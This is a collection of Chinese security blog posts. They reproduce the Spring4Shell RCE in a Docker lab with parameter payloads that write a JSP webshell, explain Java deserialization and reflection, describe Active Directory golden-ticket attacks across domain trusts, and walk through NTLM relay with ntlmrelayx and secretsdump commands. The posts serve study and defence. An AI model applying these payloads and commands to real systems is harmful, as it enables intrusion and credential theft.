[{"content":"Spring Beans RCE 复现 影响范围  JDK \u0026gt;= 9 使用了 Spring 框架及其衍生框架spring-beans-*.jar文件或存在CachedIntrospectionResults.class  漏洞介绍 Spring MVC 框架的参数绑定功能支持将请求中的参数绑定到控制器方法中参数对象的成员变量，本质上就是参数绑定引发的变量覆盖漏洞。公开的利用链是通过求获取 AccessLogValve 对象并注入恶意字段值，从而触发 pipeline 机制实现任意路径下写文件。\n漏洞复现 环境 docker 镜像：\ndocker pull vulfocus/spring-core-rce-2022-03-29:latest\rdocker run -d -p 8080:8080 --name spring-core-rce vulfocus/spring-core-rce-2022-03-29\r原理及利用 本质就是变量覆盖修改 tomcat 的 log 配置，实现在webapp/path下写入 jsp，实现命令执行。\n 发送请求修改tomcat 日志文件名 和 路径  # 设置文件后缀为 .jsp\rclass.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\r# 设置文件前缀为 shell\rclass.module.classLoader.resources.context.parent.pipeline.first.prefix=shell\r# 设置日志文件的路径为 webapps/path，只有该文件下的 jsp 文件会被解析\rclass.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\r 发送请求设置 log 的pattern 和 fileDateFormat，其中 pattern 具有固定格式，根据官方定义，pattern 的值可以是common 和 combined  # common 的定义\r%a - Remote IP address. See also %{xxx}a below.\r%A - Local IP address\r%b - Bytes sent, excluding HTTP headers, or '-' if zero\r%B - Bytes sent, excluding HTTP headers\r%h - Remote host name (or IP address if enableLookups for the connector is false)\r%H - Request protocol\r%l - Remote logical username from identd (always returns '-')\r%m - Request method (GET, POST, etc.)\r%p - Local port on which this request was received. See also %{xxx}p below.\r%q - Query string (prepended with a '?' if it exists)\r%r - First line of the request (method and request URI)\r%s - HTTP status code of the response\r%S - User session ID\r%t - Date and time, in Common Log Format\r%u - Remote user that was authenticated (if any), else '-' (escaped if required)\r%U - Requested URL path\r%v - Local server name\r%D - Time taken to process the request in millis. Note: In httpd %D is microseconds. Behaviour will be aligned to httpd in Tomcat 10 onwards.\r%T - Time taken to process the request, in seconds. Note: This value has millisecond resolution whereas in httpd it has second resolution. Behaviour will be align to httpd in Tomcat 10 onwards.\r%F - Time taken to commit the response, in milliseconds\r%I - Current request thread name (can compare later with stacktraces)\r# combined 定义\r%{xxx}a write remote address (client) (xxx==remote) or connection peer address (xxx=peer)\r%{xxx}i write value of incoming header with name xxx (escaped if required)\r%{xxx}o write value of outgoing header with name xxx (escaped if required)\r%{xxx}c write value of cookie with name xxx (escaped if required)\r%{xxx}r write value of ServletRequest attribute with name xxx (escaped if required)\r%{xxx}s write value of HttpSession attribute with name xxx (escaped if required)\r%{xxx}p write local (server) port (xxx==local) or remote (client) port (xxx=remote)\r%{xxx}t write timestamp at the end of the request formatted using the enhanced SimpleDateFormat pattern xxx\r本来是可以直接在 pattern中直接写入 payload，例如：\nclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=666\rclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25out.println(123);%25%3E\r结果出现错误，主要是因为写入的字符中包含%字符，该字符在日志配置中有特殊作用，因此报错如下：\n\r\n所以尝试用combined中的一些定义尝试写入 webshell，避免%的直接写入：\n# 法一：根据定义使用 `%{xxx}i` 从 HTTP Header 去读取值并写入\rclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=666\rGET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7Di HTTP/1.1\rHost: IP:PORT\rcmd: \u0026lt;%out.println(123);%\u0026gt;\r\r\n法一存在缺陷，无法写入\u0026quot;，存在转义：\n\r\n# 法二：根据定义使用 `%{xxx}t` 直接写入以 simpleDateFormat 格式定义的 timestamp，这个 timestamp 是可以包含 `%` 和 `\u0026quot;` 字符\rclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=888\rGET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25%7B%25%7Dtout.println(%22mytest%22);%25%7B%25%7Dt%3E HTTP/1.1\rHost: IP:PORT\r\r\n排查与修复   排查\n jdk 版本 不论是 war 包还是 jar 包，解压后排查spring-beans-*.jar格式的文件、排查CachedIntrospectionResuLts.class文件    临时修复\n  依靠 WAF 规则中对参数中所有出现的 class.*， Class.*，*.class.*， *.Class.* 字符串过滤\n  在应用中全局搜索@InitBinder注解，看看方法体内是否调用dataBinder.setDisallowedFields方法，如果发现此代码片段的引入，则在原来的黑名单中，添加{\u0026quot;class.\u0026quot;,\u0026quot;Class.\u0026quot;,\u0026quot;.class.\u0026quot;, \u0026quot;.Class.\u0026quot;}\n 如果此代码片段使用较多,需要每个地方都追加\n     ","date":"2022-04-04T00:00:00Z","image":"https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/","title":"Spring Beans RCE 复现"},{"content":"java 反序列化-1 基础 相关方法 # 序列化\rObjectOutputStream 类的 writeObject()\r# 反序列化\rObjectInputStream 类的 readObject()\r前提 实现 java.io.Serializable 接口才可被反序列化，而且所有属性必须是可序列化的(用 transient 关键字修饰的属性除外，不参与序列化过程)。\n基本原理 Demo：\npublic static void main (String args[]) throws Exception {\rString obj = \u0026quot;hello world!\u0026quot;;\r// 创建一个包含对象进行反序列化信息的”object”数据文件\rFileOutputStream fos = new FileOutputStream(\u0026quot;object\u0026quot;);\rObjectOutputStream os = new ObjectOutputStream(fos);\r// writeObject()方法将obj对象写入object文件\ros.writeObject(obj);\ros.close();\r// 从文件中反序列化obj对象\rFileInputStream fis = new FileInputStream(\u0026quot;object\u0026quot;);\rObjectInputStream ois = new ObjectInputStream(fis);\r// 恢复对象\rString obj2 = (String)ois.readObject();\rSystem.out.print(obj2);\rois.close();\r}\r 序列化后写入 object 文件的数据如下  \r\n序列化后的数据开头包含两字节的魔术数字：ACED。接下来是两字节的版本号 0005 的数据。此外还包含了类名、成员变量的类型和个数等。\n 写入 object 后，使用readObject方法读取序列化后的数据  \rimage-20220313211009425\r\n漏洞就发生在当readObject() 方法被重写，反序列化该类时调用便是重写后的 readObject() 方法。如果该方法使用不当的话就有可能引发恶意代码的执行。\n例如：\nclass MyObject implements Serializable{\rpublic String name;\r// 重写readObject()方法\rprivate void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{\r// 执行默认的readObject()方法\rin.defaultReadObject();\r// 执行打开计算器程序命令\rRuntime.getRuntime().exec(name);\r}\r}\r当进行对象的反序列化时，就会执行readObject方法里的命令执行方法：\n\r\n实际情况下的反序列化会比较复杂，与 java 各类特性相关。\nJava 反射特性 反射是大部分语言都有的，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的⽅法可以调用，总之通过反射，可以将Java这种静态语言附加上动态特性。\n 动态特性：\n⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化\n 例如如下 Demo, 当不知道传入参数值时，是无法晓得他的实际作用。\nDemo1：\npublic void execute(String className, String methodName) throws Exception {\rClass clazz = Class.forName(className);\rclazz.getMethod(methodName).invoke(clazz.newInstance());\r}\r上述例子中包含了几个重要的与反射相关的方法：\n 获取类对象的方法：forName 实例化类对象的方法：newInstance 获取函数的方法：getMethod 执行函数的方法：invoke  获取类对象的方法 Java 中类本身也是一个对象，java.lang.Class 类的实例，这个实例称为类对象：\n 类对象用于提供类本身的信息，比如有几种构造方法， 有多少属性，有哪些普通方法  想要获得一个类的属性和方法，就必须先获得该类的类对象。\n方法：\n obj.getClass() 如果上下文中存在某个类的实例 obj ，可以直接通过 obj.getClass() 来获取它的类 Test.class 如果已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个方法其实不属于反射 Class.forName 如果知道某个类的名字，想获取到这个类，就可以使用 forName 来获取  利用类对象创建实例 假设目前有一个Person类：\npublic class Person implements Serializable {\rprivate String name;\rprivate Integer age;\rpublic Person(String name, Integer age) {\rthis.name = name;\rthis.age = age;\r}\rpublic String getName() {\rreturn this.name;\r}\rpublic Integer getAge() {\rreturn this.age;\r}\r}\r与直接new Person()不同，基于反射必须先拿到类对象，然后通过类对象获取构造器对象，再通过构造器对象创建一个对象。\npublic static void main (String args[]) throws Exception {\rClass PersonClass = Class.forName(\u0026quot;Person\u0026quot;);\rConstructor constructor = PersonClass.getConstructor(String.class, Integer.class);\rPerson p = (Person)constructor.newInstance(\u0026quot;cool\u0026quot;, 18);\rSystem.out.println(p.getName());\r}\r有了实例，就可以访问其属性，使用其方法。\n利用反射执行代码 // java.lang.Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);\rClass clazz = Class.forName(\u0026quot;java.lang.Runtime\u0026quot;);\rclazz.getMethod(\u0026quot;exec\u0026quot;, String.class).invoke(clazz.getMethod(\u0026quot;getRuntime\u0026quot;).invoke(clazz),\r\u0026quot;calc.exe\u0026quot;);\r上述代码本质上就是调用了java.lang.Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;)。\n使用到了getMethod和invoke：\n getMethod  getMethod 的作用是通过反射获取一个类的某个特定的公有方法。Java中支持类的重载，不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，需要传给他需要获取的函数的参数类型列表。\n而这里Runtime.exec有6个重载：\n\rimage-20220313221949328\r\n这里使用第一个，所以使用getMethod(\u0026quot;exec\u0026quot;, String.class)获取到了第一个方法。\n invoke  invoke 的作用是执行方法，它的第一个参数是：\n如果这个方法是一个普通方法，那么第一个参数是类对象\r如果这个方法是一个静态方法，那么第一个参数是类\r正常执行方法是 [1].method([2], [3], [4]\u0026hellip;) ，在反射里就是 method.invoke([1], [2], [3], [4]\u0026hellip;) 。\n所以上述例子可分解为：\nclass clazz = Class.forName(\u0026quot;java.lang.Runtime\u0026quot;);\rMethod execMethod = clazz.getMethod(\u0026quot;exec\u0026quot;, String.class);\rMethod getRuntimeMethod = clazz.getMethod(\u0026quot;getRuntime\u0026quot;);\rObject runtime = getRuntimeMethod.invoke(clazz);\rexecMethod.invoke(runtime, \u0026quot;calc.exe\u0026quot;);\r另一种常用的执行命令的方式是 ProcessBuilder，通过反射来获取其构造函数，然后调用 start() 来执行命令:\nClass clazz = Class.forName(\u0026quot;java.lang.ProcessBuilder\u0026quot;);\rclazz.getMethod(\u0026quot;start\u0026quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\u0026quot;open\u0026quot;, \u0026quot;/System/Applications/Calculator.app\u0026quot;)));\r获取私有方法 当一个方法是私有方法(例如私有构造函数)，能否通过反射执行它？\n使用getDeclared 系列的反射，它与普通的 getMethod 、 getConstructor 区别：\n getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了  getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法 getConstructor 类似。\n例如，Runtime这个类的构造函数是私有的，之前需要用 Runtime.getRuntime() 来获取对象。其实现在也可以直接用 getDeclaredConstructor() 来获取这个私有的构造方法来实例化对象，进而执行命令：\nclass clazz = Class.forName(\u0026quot;java.lang.Runtime\u0026quot;);\rConstructor m = clazz.getDeclaredConstructor();\rm.setAccessible(true); // 获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用\rclazz.getMethod(\u0026quot;exec\u0026quot;, String.class).invoke(m.newInstance(), \u0026quot;calc.exe\u0026quot;);\r","date":"2022-03-10T00:00:00Z","image":"https://coollllllll.github.io/p/java-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/java-1/","title":"java 反序列化-1"},{"content":"基于域信任关系的域攻击 域信任 建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管理和维护。这种模式在带来便利的同时，也存在很多可被恶意攻击者利用的地方。\n域信任关系可以是**单向\\双向信任、可传递\\不可传递信任、内部\\外部信任、跨域链接信任(cross link trust)**等类型。\n例如，2 个域之间有单向可传递的外部信任关系。同一个森林(Forest)内部的域信任关系，一般隐含为双向可传递的内部信任关系。\n\r\n各类关系 加入一个新的域到已存在的森林里：\n\r\n父子信任关系是最常见的域信任关系，在同一个森林内部，加入一个新域时，最常见的是子域模式(Parent- Child)，或者是树根模式(Tree-Root)，这两种模式分别会建立父子信任\\树根信任关系，都是双向可传递的内部信任关系。\n\r\n 父子域一般会存在域名上的规律，TreeRoot方式则没有\n 跨域链接信任（cross link)，指的是在同一个森林的两个子域间建立直接的信任关系。因为在同一个森林中，域的组织关系是树状结构，从一个子域到另外一个域，需要从树枝的子域顺寻到根域(Forest Root)，然后从根域继续顺寻到另外一个子域，而跨域链接相当于 在 2 个子域之间直接建立了一个快捷方式的信任关系，以减少认证和授权的时间和步骤。\n内部信任指的是森林内部域之间的信任关系。相应地，外部信任(External Domain Trust)指的是域和所在森林之外的域之间的信任关系。\n跨域认证和资源访问授权 当 2 个域之间建立域信任关系时，会建立共享的域间密钥(Inter-Realm Key，简写为IRKey)，其作用相当于 Krbtgt，只不过 IRKey 用于相互信任的 2 个域之间的认 证，而 Krbtgt 用于同一个域服务器的 AC 和 KDC 之间的认证。\n信任域之间的认证授权过程，与同一个域中的认证授权大抵相似，但仍然有不少区别。\n\r\n Jack 向 DC1 发起认证请求，数据由 Jack 的口令 NTLM 值加密 DC1 使用 Jack 的口令 NTLM 值验证收到的认证请求，返回一个通过认证的 TGT 票据给 Jack Jack 使用 TGT 票据，向 DC1 发起授权请求，发起 请求访问 DC2 中文件服务的 TGS_REQ DC1 检查到文件服务在 DC2 中，返回一个可转投的 TGT(Referral TGT)，指明需转投到 DC2，使用 IRKey 加密可转投 TGT 中的认证信息 Jack 收到可转投的 TGT 后，根据提示信息，使用转投 TGT，发起访问 DC2 中文件服务的请求 TGS_REQ DC2 收到请求后，使用 IRKey 验证可转投 TGT 中的认证信息，返回一个允许访问文件服务的 TGS 票据，票据中部分信息使用运行文件服务的服务账号的口令 NTLM 值加密 Jack 使用收到的 TGS 票据访问 DC2 中的文件服务 文件服务的服务账号使用口令 NTLM 值校验 TGS，成功则允许访问  当 2 个域之间建立信任关系时，会在全局域数据库中存档对方的 SPN、DNS 等信息，方便访问时进行查询。例如，上图中，DC1 会存档 DC2 中所有的服务 SPN、DNS 等信息。\n如果 Jack 请求访问的服务在 DC1 的全局数据库中，则会返回转投 TGT，如果不在，如果 DC1 有父域，则 DC1 会向父域请求直至森林的根域服务器，如果 DC1 本身是根服务器(本例中 DC1 是根域服务器)，则直接告诉 Jack，请求访问的服务不存在。\n一个森林只有一个全局数据库(根域内)。但是森林内部存在的cross link信任关系不会存于这个全局数据库。\n 当未建立信任关系时，森林内部想要跨域访问，必须逐级往上到根域，再顺寻到目标域；当建立信任关系后(森林内部跨链接信任或森林间信任)，则会在找到根域之后直接返回转投TGT。\n SIDHistory 版跨域黄金票据 非跨域黄金票据 在一个域中，一旦我们获取 Krbtgt 的 NTLM 值，则可以构造黄金票据，伪造成域内任意用户，包括管理员，获取对域的完全访问控制权限。但是在同一个森林的不同域中，黄金票据不再有效。\n黄金票据的几大要素：域名、域的SID(Security Identifier)、本域 Krbtgt 用户口令 NTLM 值、想伪造票据的用户 RID(Relative Identifier，在无特别指明情况下，Mimikatz 工具会设置 RID 为域管理员的 RID)。\n不同的域有不同的 Krbtgt，导致黄金票据在不同的域之间失效。\n\r\n跨域版黄金票据 如果一个用户的 SIDHistory 属性被设置为高权限组或者用户的 ID，则该用户也具备等同于高权限组或者用户的权限。如果我们伪造的黄金票据中加入目标域的域管理员组的 SID，则可以获取目标域的域管理员权限，黄金票据和 SIDHistory 的结合，可实现跨域黄金票据。\n由于每个域的 SID 都不同，叠加 SIDHistory 的黄金票据不具备通用性。根据微软的描述，在同一个域森林内部，企业管理组 EA(Enterprise Administrators) 会自动被森林内部所有域加入到本域的域管理员组，且 EA 只存在于根域中，所以企业管理组 EA 的 SID 固定为根域的 SID 加上固定的 RID 即 519。\n因此，如果将使用企业管理组EA的SID设置SIDHistory属性，和黄金票据结合，则在只获取任意一个域krbtgt账号NTLM值的前提下，可实现森林内所有域的跨 域黄金票据，这种票据可简称为SIDHistory版黄金票据。\n当然也可以添加指定域的管理员SID为SIDHistory，这种黄金票据只对当前指定域有效，对其他域无效。\n\r\n仍然在lab.adsec. com域中构造黄金票据,但添加了SIDS参数，使用根域的企业管理员SID作为参数值，即SIDHistory版黄金票据，对lab.adsec.com和adsec.com域均有效。\n 注意：\n实现SIDHistory版黄金票据的基础是森林内信任关系，因为如果不是森林内信任关系，则SIDHistory会被微软的SID Filter规则过滤掉,从而失效，但森林内部不会有SID Filter规则。这也是为什么说森林是安全边界而非域。\n IRKey 版跨域黄金票据 当2个域之间建立域信任关系时，需要建立共享的域间密钥（Inter-Realm Key，简写为IRKey），其作用相当于Krbtgt，只不过IRKey是用于相互信任的2个域之间，而Krbtgt用于同一个域服务器的AC和KDC之间。\n只要获取森林内部任意域的krbtgt账号的NTLM值，则通过SIDHistory版黄金票据，即可获取全森林所有域的控制权。因此为了防御，必须2次修改森林内部所有域的krbtgt账号的NTLM值。\n在多域环境中，IRKey和主机账号类似，系统默认每30天自动修改一次NTLM。所以即使2次修改森林内所有域的krbtgt账号的NTLM，IRKey的NTLM大概率仍然没有发生 改变（小概率是krbtgt的NTLM修改正好碰上了IRKey的修改周期）。\n可以使用IRKey伪造域间可转投票据(Inter-Realm Referral TGT),获取目标域的域管理员权限，然后再结合SIDHistory版黄金票据，再次获取整个森林的控制权。需要注意的是SID为目标域的SID。\n在域中，大部分带$符号的账号为Computer账号，但是User组带$符号的账号为信任账号，可以通过域服务器自带的Powershe11命令Get-ADUser获取所有带$符号的User账号，例如下图中的ADSECS$账号为信任账号，隶属 于Users组：\n\r\n Dcsync 获取信任账号NTLM  \r\n lsadump::trust /patch获取信任账号NTLM  \r\n 从图中可看到有[IN]LAB.ADSEC.COM-\u0026gt;ADSEC.COM和[OUT]ADSEC.COM-\u0026gt;LAB.ADSEC.COM两种不同的NTLM值，分别是往外到其他域和往内到本域访问时用到的值。因为双向信任关系其实是2个单向信任关系的叠加，所以会有2个密钥。为了从本域lab.adsec.com构造IRKey版黄金票据并访问森林内部其他域，所以使用IN这个NTLM值。\n 由于IRKey存在于森林内部的信任域之间，也存在于森林外部的森林之间，均可用于转投认证。在SIDHistoy版黄金票据中，由于SID Filter规则，在森林之间不能使用，但是IRKey版不涉及这个安全过滤规则，仍然有效。IRKey版黄金票据可以分作森林内部、森林外部2种，操作方法类似。\n mimikatz生成IRkey版跨域黄金票据  \r\n 虽然参数还是krbtgt，但是值已经是IRKey账户的NTLM\n 域间转投票据的认证，依靠IRKey加密。在已知IRKey的前提下，可以伪造持有该IRKey的信任域的任意用户。上图测试中，我们构造一个票据，告诉adsec.com域，转投认证的用户为administrator,而且SIDHistory为根域的企业管理员。\n构造成功后，具备adsec.com的管理员权限，但是不能高权限访问lab.adsec.com，因为构造的票据是到adsec.com域的管理员票据。在获取adsec.com域的高权限后，可以获取该域的krbtgt账号的NTLM值，在此基础上，继续构造SIDHistory版黄金票据，从而可以获取整个森林的控制权。\n域信任关系的获取 在大型域网络中，因为公司并购、企业重组、业务扩展等各种原因，域网络的组织模式、信任关系各有不同。这些不同的信任关系，均存放在森林根域的数据库中(Global Catalog)，有多种方式可以获取这些数据。\nPowerSploit \r\nGet-NetForestTrust获取指定域的森林间信任关系。Get-NetDomainTrust获取指定域所在森林内部所有信任关系。一般，只要指定域信任当前主机所在的域，就可以获取对方的信任关系数据。\n在查询时可以使用Export-CSV -NoTypeInformation将输出结果转换为CSV格式，命令为Get-DomainTrustMapping -API Export-CSV -NoTypeInformation trusts-mapping.csv。然后使用TrustVisualizer工具进行可视化输出。最后使用yED工具转换为可视化图形。\n\r\n\r\nBloodHound 利用域信任实现跨域攻击 如果一个域内用户(假设用户为 eviluser)想访问其他域的资源访问，首先确保目标域信任当前用户所在的域，这是基本前提，然后必须具备以下3个条件之一：\n eviluser 被目标域加入了某个组，这个组在目标域中具有资源访问权限 eviluser 被目标域中的某些主机或服务器添加为本地组，例如被某台服务器添加为本地管理员组 当前用户被目标域的某些域对象添加为访问控制 ACL 的安全主体(Security Principal)，例如可以修改某个域用户对象的口令  根据前面内容，只要获取了当前域的 Krbtgt 账号或者 IRKey 账号的 NTLM 值， 即可获取整个森林的控制权。然而实际情况下并不一定能顺利获取某个域的 Krbtgt 账号或者 IRKey 账号的 NTLM 值，例如域资源少、配置严谨、系统更新及时等，这时需要绕道至更大的域，才有更多的机会获取 Krbtgt 账号或者 IRKey 账号的 NTLM 值，因为资源越多，存在脆弱点的概率越大。\n要实现从当前用户 eviluser 开始，跨域攻击 A 域，首先得确保当前用户具备跨域访问 A 域资源的权限，所以攻击环节应该包括几个步骤：\n  从当前域的数据库中，枚举有哪些域信任当前域 (出)，由于是攻击其他域，所以不用关注当前域信任哪些外部域(入)\n  利用信任关系，枚举目标域中哪些组包含外来域的用户。在域内通常有 3 种 类型的组：\n 第 1 种是域本地组(Domain Local Groups)，可以添加跨域、跨森林的组成员，也是最常见的组 第 2 种是全局组(Global Groups)，不允许有任何跨域组成员，即使是同一个森林也不可以 第 3 种是通用组(Universal Groups)，可以添加森林内的任何成员，但是跨森林的不可以  一般只关注第1和第3种组，一个用户的 memberof 属性由组的 member 属性计算 而来，前提是组的 member 属性已经更新到全局目录数据库中(Global Catalog)。如果一个用户被森林中另外一个域添加为通用组成员，通用组将 member 属性更新到森林的全局目录数据库中，用户的 memberof 属性会通过计算被更新。\n一个用户被森林中另外一个域添加为域本地组成员时，由于域本地组不会更新 memberof 属性到全局目录数据库中，因此用户的 memberof 属性也不会被计算更新。所以，即使我们有权限查询森林的全局目录数据库，也只能得到被添加到其他域通用组的成员属性，要想获得加入其他域域本地组的成员属性，需要逐个轮询所有的域。\n  枚举目标域中主机\\服务器的本地组，查看哪些外来用户被加入到主机\\服务器的本地组，可以通过 GPO 组策略进行枚举，也可以通过 PowerView 逐个探测，或使用 BloodHood 自动化全部探测\n  枚举目标域内对象的 ACL，检查是否有包含外来域用户的域对象 ACL。一般而言，任意用户均可查看所有域内对象的 ACL，同时全局数据库中保存了所有域对象的 ACL，可以很方便进行枚举。PowerView 提供了 Get-DomainObjectACL 命令去获取这项信息。\n  \r\n  对前面几步筛选出的用户做第二次筛选，筛选出属于当前域的用户，作为在当前域中的攻击对象，例如获取目标用户的 NTLM 值或者 TGT 票据等。\n  利用获取的用户的NTLM值或者TGT票据进行跨域，进入目标域，然后攻击获取目标域的 Krbtgt 账号或者 IRKey 账号的 NTLM 值，如果条件不成熟，继续上面的步骤，逐步进入更多的域中寻找机会。\n当一个用户被森林外部域加入某个组时，会出现在外部目标域的 CN=ForeignSecurityPrincipals,DC=domain,DC=com 组中，相当于用户在外部域中的代表或者别名，而且域中的所有外来用户具备相同的 SID，这是跨森林的 SID 过滤安全机制的效果。\n所以只要枚举 ForeignSecurityPrincipals 组，就可得知哪些用户具有这个外部森林的访问权限，假设用户结果集合为 ExternalUsers。接下来，先查看是否包含我们当前所在域的用户，如果有，则直接攻击这些用户获取 NTLM 值或者 TGT 票据，从而获取森林外部域的资源访问权限。\n如果没有，则查看 ExternalUsers 是否包含我们当前所在森林的用户，假设结果合集为 InternalUsers。在当前森林中查询定位 InternalUsers 所在的域。以这些域为目标，使用森林内部的跨域攻击方法，攻击这些域，获取进入这些域的权限，再从这些域中攻击 InternalUsers 中的用户，从而获取外部域的资源访问权限。\n  SID过滤机制 SIDHistory SIDHistory属性的存在是为了解决用户在迁移到另一个域中的时候权限会改变的问题。例如用户a在A域中本来是管理员，迁移到B域的时候因为SID的改变有可能会变成普通用户权限，这时候如果给a用户添加一个值为a在A域中的SID的SIDHistory值，就可以解决这个问题，只有域管有更改SIDHistory的权力。\n当一个用户迁移到新的域后，原来的 SID 以及所在组的一些 SID，都可被加入到新域中新用户的 SIDHistory 属性。当这个新的用户访问某个资源时，根据 SID 或者 SIDHistory 在资源 ACL 中的匹配性来判断是拒绝或者允许访问。因此 SIDHistory 相当于多了一个或者多个组属性，最终权限得到了扩张。\nSID 过滤 当一个用户的 TGT 通过域信任关系被转递到一个新域后，TGT 中的 PAC(privileged attribute certificate) 包含用户的 SID 和 SIDHistory。新域对 PAC 进行严格的审查 ，并根据信任关系的类别执行各种安全过滤机制\n有些 SID 是一直被拒绝的，例如企业管理员 (S-1-5-21-\u0026lt;Domain\u0026gt;-519) 的 SID 是被 ForestSpecific 规则过滤，因为森林拒绝来自森林之外的特权 SIDHistory。\n","date":"2022-03-01T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-14/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-14/","title":"基于域信任关系的域攻击"},{"content":"NTLM Relay NTLM 中间人(重放)攻击。\n简介 B 是一个 smb 服务器，A 来进行认证，B 将 A 的认证信息转发到 C 上，如果 A 的凭证在 C 上认证成功就能进行下一步操作，如创建服务、执行命令。\n如果在域中控制了某些常用服务，如：WEB OA 系统、文件共享等服务则可以尝试使用 SMB 中继攻击来引诱域管理员访问，并转发凭证，从而达到获取其他机器权限的目的。\nNTLM 认证过程 客户端-服务端：\n\r\n客户端-服务端-DC端：\n\r\n 在域环境下，用户的 NT Hash 不再存储在服务器上，而是存储在域控制器上。用户要认证的服务器会收到客户端对 Challenge 加密的响应报文，但它不能检查该响应是否有效，因此，服务端需要把验证身份的任务委托给域控制器。\n而服务端在和域控制器通信时，使用Netlogon服务，该服务能够与域控制器建立安全会话，被称为安全通道(Secure Channel)，从而安全传输客户端发来的响应。\n 中继攻击原理 \r\n基本流程如上图所示，攻击者介于客户端和服务器之间，同时充当了服务端和客户端。攻击者所做的事情就是让诱导客户端访问自己所建立的服务端，成功拿到请求，而攻击者又充当客户端向受害服务端转发认证请求，受害服务端返回challenge，攻击者转发，真正的客户端使用 NTLM 加密返回给攻击者，攻击者再转发给受害服务端，认证完成。\n那么以服务端视角来看，即是这样的流程：\n\r\n最终，攻击者等同于代表真正客户端用户去访问受害服务器。\nHTTP -\u0026gt; SMB 攻击流程  nmap 探测 SMB 签名  nmap -p445 --script=smb-security-mode.nse IP --open\r 选择那些未开启 smb 签名的主机作为目标。\n  开启 HTTP 服务并中继到目标 smb  ntlmrelayx.py -t IP(受害者) -socks -smb2support\r 完成后会攻击机本地会开启 socks 端口。\n  基于 socks 代理 dump 目标机器上用户 NTLM  proxychains python3 secretsdump.py pentest.com/Administrator@IP\r认证与会话 认证与会话是分离的，即：先进行认证，认证完成后再进行会话通信，例如 HTTP 访问、SMB 访问共享文件等。\n两个过程相互独立，那意味着可以从一个协议中继到另一个协议，称为跨协议中继：\n\r\n为了验证通信数据的真实性，引入了签名机制，即防止任意一个用户修改通信内容。实际上，在NTLM Negotiation 阶段会让客户端或服务器了解对方是否支持签名(Negotiate Flags)。\n 当 Negotiate Sign flag 为 1 时，表明客户端支持签名。但是并不意味着签名是必要的，只是说明客户端有签名的能力。同理，服务端也是类似的。对于某些协议，即使客户端和服务器都支持签名，这并不一定意味着数据包会被签名。\n 签名实现 可以通过一些选项来表明签名是否强制执行。\n Disabled：禁用签名 Enabled：可以在需要时处理签名，但不强制签名。 Mandatory：表明不仅支持签名，而且必须对数据包进行签名才能继续会话。  SMB 协议的配置 \r\n  Microsoft 客户端：表示作为 SMB 客户端时，是否要对通信进行签名\n  Microsoft 服务端：表示作为 SMB 客户端时，是否要对通信进行签名\n  SMB 协商阶段中有关签名的参数：\n  \r\n Enabled：可以支持签名，能够处理签名\nRequired：但是不需要签名\n也就是客户端 或 服务端只要有一个开启 Required，那么数据包就会被签名\n LDAP 协议的配置  Disabled：不支持数据包签名。 Negotiated：表示可以处理签名，如果与之通信的机器也可以处理签名的话，那么后续的数据将被签名。 Required：表示不仅支持签名，而且必须对数据包进行签名才能继续会话。  与 SMBv2 相比，LDAP 只要有一个开启 Negotiated，那么数据包就会被签名。LDAP 使用与 NTLM 协商中相同的 flag 标志位。在客户端和服务器都支持 LDAP 签名的情况下，将设置 NEGOTIATE_SIGN 标志并对数据包进行签名。如果一方要求签名，而另一方不支持，则会话根本不会开始。需要签名的一方将忽略未签名的数据包。\n因此，想要实现 LDAP 的身份验证中继，需要具备两个条件：\n 服务器必须不需要数据包签名，默认情况下所有机器都是这种情况 客户端不得将 NEGOTIATE_SIGN 标志设置为 1。如果他这样做了，那么服务器将需要签名，并且由于我们不知道用户的密钥，就无法对伪造的 LDAP 数据包进行签名。   Windows SMB 客户端设置 NEGOTIATE_SIGN 该参数为 1，默认情况下，无法将 SMB 身份验证中继到 LDAP。\n  首先想到，是否可以修改 NEGOTIATE_SIGN 这个标志，实际上，该标志最终收到 MIC(Message Integrity Code) 的保护，所以无法直接修改该标志。\n Session Key 签名涉及到用户的密钥，但实际情况下，并不是真正的用户的密钥，而是基于用户密钥生成的 Session Key。\nSession Key 的计算方法：\n# NTLMv1\rKey = MD4(NT Hash)\r# NTLMv2\rNTLMv2 Hash = HMAC_MD5(NT Hash, Uppercase(Username) + UserDomain)\rKey = HMAC_MD5(NTLMv2 Hash, HMAC_MD5(NTLMv2 Hash, NTLMv2 Response + Challenge))\r客户端是可以计算 Session Key 的，问题是：在域环境下，应用服务器并不知道用户的 NTLM，无法完成 key 计算，所以会依靠域控去帮它完成计算。\n对于域帐户的身份验证，服务器会让域控制器为它计算 Session Key，然后将其返回。服务器以 NETLOGON_NETWORK_INFO 结构向域控制器发送请求，域控制器以 NETLOGON_VALIDATION_SAM_INFO4 结构响应。如果身份验证成功，会话密钥将在域控制器的此响应中发送。\n 